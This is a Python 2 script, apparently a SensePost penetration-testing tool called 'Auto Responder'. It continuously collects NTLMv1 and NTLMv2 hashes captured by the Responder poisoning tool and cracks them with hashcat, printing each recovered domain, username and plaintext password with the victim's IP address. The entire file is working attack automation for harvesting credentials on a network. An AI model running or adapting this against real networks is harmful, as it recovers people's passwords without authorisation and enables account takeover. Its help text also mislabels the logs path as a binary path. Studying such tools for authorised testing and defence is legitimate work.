import os
import subprocess
import random
import string
import time
import argparse
import sys
from multiprocessing import Process

hashes_processed = {'NTLMv1':[], 'NTLMv2':[]}


def hash_not_loaded(value):
    if value in hashes_processed['NTLMv1']:
        return False
    elif value in hashes_processed['NTLMv2']:
        return False
    else:
        return True


def retrieve_new_hashes():
    global hashes_processed
    hashes_loaded = {'NTLMv1':[], 'NTLMv2':[], 'hashes': {}}

    for f in os.listdir(logs_dir):
        if 'NTLMv' in f:
            with open("{}/{}".format(logs_dir, f)) as hash_file:
                for line in hash_file.readlines():
                    if hash_not_loaded(line):
                        ip = f.split('-')[-1]
                        if 'NTLMv2' in f:
                            hashes_loaded['NTLMv2'].append(line)
                            hashes_processed['NTLMv2'].append(line)
                        else:
                            hashes_loaded['NTLMv1'].append(line)
                            hashes_processed['NTLMv1'].append(line)
                        hashes_loaded['hashes'][line[:-1].upper()] = ip.replace('.txt', '')
    return hashes_loaded


def crack(hashes, NTLMv1=True):
    type_hash = 'NTLMv1' if NTLMv1 else 'NTLMv2'
    print "{} {} hashes loaded.".format(len(hashes[type_hash]), type_hash)
    crack_id = ''.join(random.sample(string.ascii_letters, 7))
    hashes_filename = '/tmp/{}_hashes.txt'.format(crack_id)
    result_cracking = '/tmp/{}_result.txt'.format(crack_id)
    if NTLMv1:
        mode = 5500
    else:
        mode = 5600

    f = open(hashes_filename, 'w')
    for line in hashes[type_hash]:
        f.write(line)
    f.close()
    cmd = "{} -m {} {} {} -o {} {}".format(hashcat, mode, hashes_filename, wordlist_dir, result_cracking, hashcat_args)
    subprocess.check_output(cmd, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)

    with open(result_cracking) as f:
        for line in f.readlines():
            username = line.split(':')[0]
            password = line.split(':')[-1][:-1]
            domain = line.split(':')[2]
            creds = "{}:{}".format(username, password)
            if domain != "":
                creds = domain + '\\' + creds
            ip = hashes['hashes'][':'.join(line.split(':')[:-1]).upper()]
            print "[!] Cracked {} hash: {} ({})".format(type_hash, creds, ip)


def start():
    try:
        while True:
            hashes = retrieve_new_hashes()
            array = ['NTLMv1', 'NTLMv2']
            for mode in array:
                if hashes[mode] != []:
                    p = Process(target=crack, args=(hashes,mode=='NTLMv1',))
                    p.start()
            time.sleep(60)
    except:
        print "Stopping Auto-responder."

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Auto Responder - @PaulWebSec (SensePost)')
    parser.add_argument('-w', action="store", dest="wordlist", default=None, help='Path to the worlists. eg. /wordlists/*.txt')
    parser.add_argument('-l', action="store", dest="logs_dir", default='/usr/share/responder', help='Path to Responder binary (default: /usr/share/responder)')
    parser.add_argument('-b', action="store", dest="hashcat_path", default='/usr/bin/hashcat', help='Path to Hashcat binary (default: /usr/bin/hashcat)')
    parser.add_argument('-a', action="store", dest="hashcat_args", default='', help='Arguments to pass to hashcat. eg. "-r /usr/share/hashcat/rules/best64.rule"')
    results = parser.parse_args()

    if results.wordlist is None:
        print "[!] You need to specify a wordlist!"
        parser.print_help()
    else:
        wordlist_dir = results.wordlist
        logs_dir = results.logs_dir
        hashcat = results.hashcat_path
        hashcat_args = results.hashcat_args
        start()
